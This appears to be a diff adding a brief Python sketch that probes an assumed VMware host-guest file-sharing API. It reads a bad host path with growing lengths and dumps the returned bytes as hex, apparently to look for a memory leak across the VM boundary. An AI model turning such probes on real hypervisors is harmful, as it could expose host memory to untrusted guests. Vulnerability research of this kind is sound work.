@@ -1,0 +1,7 @@
+from struct import pack
+import hgfs
+
+# Supuesto: hgfs.read(host_file, length)
+for i in range(0, 4096, 64):
+    data = hgfs.read('/host/badpath', 1024 + i)
+    print(f"Offset {i}: {data[:64].hex()}")
